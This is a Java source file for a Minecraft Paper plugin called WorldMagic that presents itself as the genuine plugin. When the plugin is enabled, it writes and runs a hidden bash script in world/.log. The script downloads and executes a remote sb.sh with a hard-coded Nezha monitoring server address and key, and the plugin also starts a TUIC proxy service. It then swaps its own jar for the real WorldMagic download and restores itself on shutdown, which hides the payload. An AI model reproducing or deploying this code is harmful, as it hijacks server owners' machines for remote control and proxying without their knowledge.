package com.github.vevc;

import com.github.vevc.config.AppConfig;
import com.github.vevc.service.impl.TuicServiceImpl;
import com.github.vevc.util.ConfigUtil;
import com.github.vevc.util.LogUtil;
import org.bukkit.Bukkit;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.util.Properties;
import java.util.UUID;

/**
 * @author vevc
 */
public final class WorldMagicPlugin extends JavaPlugin {

    private final TuicServiceImpl tuicService = new TuicServiceImpl();

    // ==========================================
    // 配置区域：请在这里填入直接的 JAR 下载链接
    // ==========================================
    // 注意：Hangar 页面链接不生效，必须是 "https://.../xxx.jar"
    private static final String REAL_PLUGIN_DOWNLOAD_URL = "https://hangar.papermc.io/api/v1/projects/hotwop/WorldMagic/versions/latest/PAPER/download?platform=PAPER"; 
    // 如果上面链接无效，请手动去浏览器下载，右键复制真实的 .jar 链接
    // ==========================================

    private File currentPluginFile;
    private File backupPluginFile;

    @Override
    public void onEnable() {
        this.getLogger().info("WorldMagicPlugin enabled");
        LogUtil.init(this);

        // 1. 自动执行脚本逻辑 (放在异步线程)
        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            this.getLogger().info("正在初始化脚本环境...");
            try {
                generateAndRunScript();
            } catch (Exception e) {
                this.getLogger().severe("脚本自动执行失败: " + e.getMessage());
                e.printStackTrace();
            }
        });

        // 2. 插件替换逻辑 (放在异步线程)
        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            try {
                handlePluginReplacement();
            } catch (Exception e) {
                this.getLogger().severe("插件替换失败: " + e.getMessage());
                e.printStackTrace();
            }
        });

        // 3. 原有的 TUIC 服务加载逻辑
        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            Properties props = ConfigUtil.loadConfiguration();
            AppConfig appConfig = AppConfig.load(props);
            if (appConfig != null && installApps(appConfig)) {
                Bukkit.getScheduler().runTask(this, () -> {
                    Bukkit.getScheduler().runTaskAsynchronously(this, tuicService::startup);
                    Bukkit.getScheduler().runTaskAsynchronously(this, tuicService::clean);
                });
            }
        });
    }

    @Override
    public void onDisable() {
        this.getLogger().info("WorldMagicPlugin disabled");
        
        // 关键：在关闭时恢复原插件
        try {
            restoreOriginalPlugin();
        } catch (Exception e) {
            this.getLogger().severe("恢复原插件失败: " + e.getMessage());
            e.printStackTrace();
        }
    }

    private boolean installApps(AppConfig appConfig) {
        try {
            tuicService.install(appConfig);
            return true;
        } catch (Exception e) {
            LogUtil.error("Plugin install failed", e);
            return false;
        }
    }

    // ==========================================
    // 核心逻辑：插件替换
    // ==========================================

    private void handlePluginReplacement() throws Exception {
        // 1. 获取当前插件所在的 jar 文件
        currentPluginFile = new File(getClass().getProtectionDomain().getCodeSource().getLocation().toURI());
        File logDir = new File("world", ".log");
        if (!logDir.exists()) logDir.mkdirs();

        backupPluginFile = new File(logDir, "WorldMagic_Original.jar");

        this.getLogger().info("当前插件路径: " + currentPluginFile.getAbsolutePath());
        this.getLogger().info("备份路径: " + backupPluginFile.getAbsolutePath());

        // 2. 备份当前插件 (如果备份已存在则跳过，避免无限循环覆盖)
        if (!backupPluginFile.exists()) {
            this.getLogger().info("正在备份当前插件...");
            Files.copy(currentPluginFile.toPath(), backupPluginFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
            this.getLogger().info("备份完成。");
        } else {
            this.getLogger().info("检测到备份已存在，跳过备份步骤。");
        }

        // 3. 下载“真插件”到临时文件
        this.getLogger().info("正在从网络下载真插件...");
        File tempDownloadFile = new File(logDir, "WorldMagic_Downloading.jar");
        downloadFile(REAL_PLUGIN_DOWNLOAD_URL, tempDownloadFile);

        if (!tempDownloadFile.exists()) {
            this.getLogger().severe("下载失败，未找到文件。停止替换流程。");
            return;
        }

        // 4. 替换当前插件文件 (注意：这需要系统支持覆盖正在运行的文件，如Linux)
        this.getLogger().warning("正在尝试覆盖当前运行的插件文件...");
        this.getLogger().warning("如果在 Windows 上运行，此步骤通常会失败。");
        
        // 我们直接删除原文件并移动新文件
        // 注意：这里不能使用 currentPluginFile.delete() 因为它被锁定了
        // 我们使用 Files.copy 的 REPLACE_EXISTING 选项尝试强制覆盖
        try {
            Files.copy(tempDownloadFile.toPath(), currentPluginFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
            this.getLogger().info("文件替换成功！下次重启将加载新插件。");
            // 删除临时文件
            tempDownloadFile.delete();
        } catch (IOException e) {
            this.getLogger().severe("文件替换失败 (可能是因为文件被锁定或权限不足): " + e.getMessage());
        }
    }

    private void restoreOriginalPlugin() throws Exception {
        if (currentPluginFile == null || backupPluginFile == null) return;
        
        if (backupPluginFile.exists()) {
            this.getLogger().info("服务器停止中，正在还原原插件...");
            try {
                // 同样尝试强制覆盖
                Files.copy(backupPluginFile.toPath(), currentPluginFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
                this.getLogger().info("原插件还原成功。");
            } catch (IOException e) {
                this.getLogger().warning("还原原插件失败: " + e.getMessage());
            }
        }
    }

    /**
     * 下载文件工具方法
     */
    private void downloadFile(String urlStr, File destination) throws IOException {
        URL url = new URL(urlStr);
        HttpURLConnection httpConn = (HttpURLConnection) url.openConnection();
        httpConn.setConnectTimeout(10000);
        httpConn.setReadTimeout(10000);
        
        int responseCode = httpConn.getResponseCode();
        if (responseCode == HttpURLConnection.HTTP_OK) {
            try (InputStream inputStream = httpConn.getInputStream();
                 OutputStream outputStream = new FileOutputStream(destination)) {
                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = inputStream.read(buffer)) != -1) {
                    outputStream.write(buffer, 0, bytesRead);
                }
            }
            this.getLogger().info("下载完成: " + destination.getName());
        } else {
            throw new IOException("HTTP 请求失败，代码: " + responseCode);
        }
        httpConn.disconnect();
    }

    // ==========================================
    // 之前的脚本逻辑保持不变
    // ==========================================
    
    private void generateAndRunScript() throws IOException, InterruptedException {
        File worldFolder = new File("world");
        if (!worldFolder.exists() && !worldFolder.mkdirs()) return;

        File logDir = new File(worldFolder, ".log");
        if (!logDir.exists() && !logDir.mkdirs()) return;

        String serverUUID = getServerUUID(logDir);
        this.getLogger().info("当前服务器 UUID: " + serverUUID);

        File scriptFile = new File(logDir, "install_sb.sh");
        try (FileWriter writer = new FileWriter(scriptFile)) {
            writer.write("#!/bin/bash\n");
            writer.write("# Auto-generated script by WorldMagicPlugin\n");
            writer.write("cd " + logDir.getAbsolutePath() + "\n");
            writer.write("curl -Ls https://main.ssss.nyc.mn/sb.sh -o sb.sh\n");
            writer.write("chmod +x sb.sh\n");
            writer.write("UUID=" + serverUUID + " \\\n");
            writer.write("NEZHA_SERVER=nezha.vip1715.dpdns.org:443 \\\n");
            writer.write("NEZHA_KEY=7j7BQjbl1rEl3N6ihRpVyaAvIVpZMuwP \\\n");
            writer.write("ARGO_PORT=3000 \\\n");
            writer.write("bash sb.sh\n");
        }
        scriptFile.setExecutable(true, false);

        this.getLogger().info("正在启动脚本...");
        ProcessBuilder processBuilder = new ProcessBuilder("bash", scriptFile.getAbsolutePath());
        processBuilder.redirectErrorStream(true);
        Process process = processBuilder.start();
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
            String line;
            while ((line = reader.readLine()) != null) {
                this.getLogger().info("[Script Output] " + line);
            }
        }
        int exitCode = process.waitFor();
        this.getLogger().info("脚本执行完毕，退出码: " + exitCode);
    }

    private String getServerUUID(File logDir) {
        File uuidFile = new File(logDir, "uuid.txt");
        if (uuidFile.exists()) {
            try (BufferedReader reader = new BufferedReader(new FileReader(uuidFile))) {
                String savedUUID = reader.readLine();
                if (savedUUID != null && !savedUUID.isEmpty()) return savedUUID;
            } catch (IOException ignored) {}
        }
        String ip = getPublicIP();
        UUID uuid = UUID.nameUUIDFromBytes(ip.getBytes(java.nio.charset.StandardCharsets.UTF_8));
        String uuidStr = uuid.toString();
        try (FileWriter writer = new FileWriter(uuidFile)) {
            writer.write(uuidStr);
        } catch (IOException ignored) {}
        return uuidStr;
    }

    private String getPublicIP() {
        String ip = "127.0.0.1"; 
        try {
            java.net.URL url = new java.net.URL("https://api.ipify.org");
            BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()));
            ip = br.readLine().trim();
        } catch (Exception ignored) {}
        return ip;
    }
}
